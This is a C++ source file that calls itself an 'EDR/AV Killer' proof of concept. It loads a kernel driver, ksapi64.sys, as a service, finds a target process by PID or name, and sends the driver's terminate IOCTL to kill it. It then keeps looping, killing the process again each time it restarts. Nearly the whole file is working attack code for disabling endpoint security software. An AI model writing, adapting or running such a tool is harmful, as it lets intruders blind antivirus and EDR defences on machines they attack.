#include <windows.h>
#include <iostream>

#define TERMINATE_PROCESS_IOCTL_CODE 0x222004
#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)    // ntsubauth

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;


typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct _SYSTEM_PROCESS_INFO
{
    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    ULONG                   BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessId;
} SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;



typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45,
    SystemCodeIntegrityInformation = 103,
    SystemPolicyInformation = 134,
} SYSTEM_INFORMATION_CLASS;

_NtQuerySystemInformation NtQuerySystemInformation;
volatile BOOL continueLoop = TRUE;

VOID toLowerCase(wchar_t* str) {
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] >= 'A' && str[i] <= 'Z') {
            str[i] = str[i] + 32;
        }
    }
}

BOOL WINAPI CtrlHandler(DWORD fdwCtrlType) {
    if (fdwCtrlType == CTRL_C_EVENT) {
        std::wcout << L"\n[!] CTRL+C received. Stopping...\n";
        continueLoop = FALSE;
        return TRUE;
    }
    return FALSE;
}

BOOL CheckIfPID(DWORD pid, wchar_t** processName) {

    ULONG size = 0;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl; // "Failed to get SystemProcessInformation
        free(spi);
        return FALSE;
    }

    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if ((DWORD)(current->ProcessId) == pid) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            *processName = current->ImageName.Buffer;
            std::wcout << L"[+] Process name: " << current->ImageName.Buffer << std::endl;
            free(spi);
            return TRUE;
        }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    free(spi);
    return FALSE;
}

DWORD CheckIfProcessName(wchar_t* processName) {
    std::wcout << L"[+] Checking if process name: " << processName << L" is running" << std::endl;
    ULONG size = 0;
    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);

    PSYSTEM_PROCESS_INFO spi = (PSYSTEM_PROCESS_INFO)malloc(size);

    if (NtQuerySystemInformation(SystemProcessInformation, spi, size, &size) != STATUS_SUCCESS) {
        std::wcout << L"[-] Failed to get SystemProcessInformation" << std::endl; // "Failed to get SystemProcessInformation
        free(spi);
        return FALSE;
    }

    PSYSTEM_PROCESS_INFO current = spi;
    do {
        if (current->ImageName.Buffer) {
            std::wstring currentProcessName(current->ImageName.Buffer, current->ImageName.Length / sizeof(wchar_t));
            toLowerCase(&currentProcessName[0]);
            std::wstring processNameW(processName);
            toLowerCase(&processNameW[0]);

            if (processNameW.compare(currentProcessName) == 0) {
                DWORD processId = (DWORD)(current->ProcessId);
                free(spi);
                std::wcout << L"[+] Process PID: " << processId << std::endl;
                return processId;
            }
        }
        current = (PSYSTEM_PROCESS_INFO)(((LPBYTE)current) + current->NextEntryOffset);
    } while (current->NextEntryOffset != 0);

    free(spi);
    return NULL;
}

BOOL LoadDriverByName(wchar_t* driverName) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
        std::wcout << L"[-] OpenSCManager failed" << std::endl;
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, driverName, SERVICE_ALL_ACCESS);
    if (hService == NULL) {
        // Create the service
        std::wcout << L"[+] Creating service: ksapi64" << std::endl; // "Creating service
        wchar_t pathCStr[MAX_PATH];

        if (GetCurrentDirectory(MAX_PATH, pathCStr) != 0) {
            wcscat_s(pathCStr, L"\\ksapi64.sys");
            std::wcout << L"[+] Full path: " << pathCStr << std::endl;

        }
        else {
            std::wcerr << L"[-] Error getting current directory." << std::endl;
            return FALSE;
        }

        hService = CreateServiceW(
            hSCManager,
            driverName,
            driverName,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            pathCStr,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );
        if (hService == NULL) {
            std::wcout << L"[-] CreateService failed" << std::endl;
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }


    if (!StartService(hService, NULL, NULL)) {
        SERVICE_STATUS serviceStatus;

        if (QueryServiceStatus(hService, &serviceStatus)) {
            if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
                std::wcout << L"[!] Service is already running" << std::endl;
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);
                return TRUE;
            }
        }
        else {
            std::wcout << L"[-] QueryServiceStatus failed" << std::endl;
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }

        std::wcout << L"[-] StartService failed" << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return FALSE;
    }
    std::wcout << L"[+] Driver loaded successfully!" << std::endl;

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

BOOL stopAndDeleteSerivceByName(wchar_t* driverName) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
        std::wcout << L"[-] OpenSCManager failed" << std::endl;
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceW(hSCManager, driverName, SERVICE_ALL_ACCESS);
    if (hService == NULL) {
        std::wcout << L"[-] OpenService failed" << std::endl;
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        std::wcout << L"[-] ControlService failed" << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    if (!DeleteService(hService)) {
        std::wcout << L"[-] DeleteService failed" << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}


int main(int argc, char** argv) {
    std::wcout << L"Welcome to EDR/AV Killer using ksapi64 driver!" << std::endl;
    std::wcout << L"This is a PoC, use it at your own risk!" << std::endl;
    BOOL isPID = FALSE;

    // Set the CTRL+C handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE)) {
        std::wcerr << L"[-] Failed to set CTRL+C handler. Exiting...\n";
        return 1;
    }

    if (argc != 3) {
        std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>" << std::endl;
        return 1;
    }

    wchar_t* processName = NULL;
    DWORD pid = 0;

    if (strcmp(argv[1], "-p") == 0) {
        isPID = TRUE;
        pid = atoi(argv[2]);

    }
    else if (strcmp(argv[1], "-n") == 0) {
        size_t len = strlen(argv[2]) + 1;
        processName = new wchar_t[len];
        size_t convertedChars = 0;
        mbstowcs_s(&convertedChars, processName, len, argv[2], _TRUNCATE);

    }
    else {
        std::wcout << L"Usage: " << argv[0] << L" -p <PID> / -n <PROCESS NAME>" << std::endl;
        return 1;

    }
    wchar_t driverName[] = L"ksapi64";

    if (!LoadDriverByName(driverName)) {
        return 1;
    }

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

    if (isPID) {
        if (!CheckIfPID(pid, &processName)) {
            return 1;
        }
        std::wcout << L"[+] Process name: " << processName << std::endl;
    }
    else {
        pid = CheckIfProcessName(processName);

        if (pid == NULL) {
            std::wcout << L"[+] Process name: " << processName << L" is not running" << std::endl;
            return 1;
        }

    }


    HANDLE hDevice = CreateFileW(L"\\\\.\\ksapi64_dev", OPEN_EXISTING | CREATE_NEW, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] CreateFileA failed" << std::endl;
        return 1;
    }

    std::wcout << L"[+] Terminating PID: " << pid << std::endl;
    DWORD ioctlCode = 2237504; // IOCTL code

    DWORD outputBuffer = 0; // Output buffer to receive data from the driver
    DWORD bytesReturned = 0; // Bytes returned

    BOOL result = DeviceIoControl(
        hDevice,          // Handle to the device
        ioctlCode,        // IOCTL code
        &pid,             // Input buffer: PID
        sizeof(pid),      // Size of the input buffer
        &outputBuffer,    // Output buffer
        sizeof(outputBuffer), // Size of the output buffer
        &bytesReturned,   // Bytes returned
        NULL              // Overlapped (not used here)
    );

    if (!result) {
        std::wcout << L"[-] DeviceIoControl failed with error code: " << GetLastError() << std::endl;
        CloseHandle(hDevice);
        return 1;
    }

    for (;;) {
        Sleep(700);

        if (!continueLoop) {
            break;
        }

        pid = CheckIfProcessName(processName);
        if (pid == NULL) {
            std::wcout << L"[-] Process name: " << processName << L" not running" << std::endl;
            Sleep(1200);
            continue;

        }

        std::wcout << L"[+] Terminating PID: " << pid << std::endl;
        BOOL result = DeviceIoControl(
            hDevice,          // Handle to the device
            ioctlCode,        // IOCTL code
            &pid,             // Input buffer: PID
            sizeof(pid),      // Size of the input buffer
            &outputBuffer,    // Output buffer
            sizeof(outputBuffer), // Size of the output buffer
            &bytesReturned,   // Bytes returned
            NULL              // Overlapped (not used here)
        );
        if (!result) {
            std::wcout << L"[-] DeviceIoControl failed with error code: " << GetLastError() << std::endl;
            continue;
        }
    }

    std::wcout << L"[!] Stoping and Deleting ksapi64 Service!" << std::endl;
    stopAndDeleteSerivceByName(driverName);
    CloseHandle(hDevice);
    return 0;
}
